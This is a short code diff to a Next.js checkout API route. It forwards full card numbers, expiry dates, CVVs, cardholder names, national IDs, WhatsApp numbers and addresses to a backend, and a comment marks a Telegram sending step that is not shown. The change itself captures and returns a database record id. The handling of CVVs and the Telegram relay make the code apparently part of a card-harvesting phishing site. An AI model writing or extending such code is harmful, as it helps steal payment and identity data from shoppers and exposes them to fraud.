@@ -7,12 +7,15 @@ export async function POST(req: NextRequest) {
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
+  let dbId: string | null = null;
   try {
-    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
+    const dbData = await dbRes.json().catch(() => ({}));
+    dbId = dbData._id ?? null;
   } catch (_) {}
 
   // Send Telegram
@@ -45,5 +48,5 @@ export async function POST(req: NextRequest) {
     );
   } catch (_) {}
 
-  return NextResponse.json({ ok: true, orderId });
+  return NextResponse.json({ ok: true, orderId, dbId });
 }
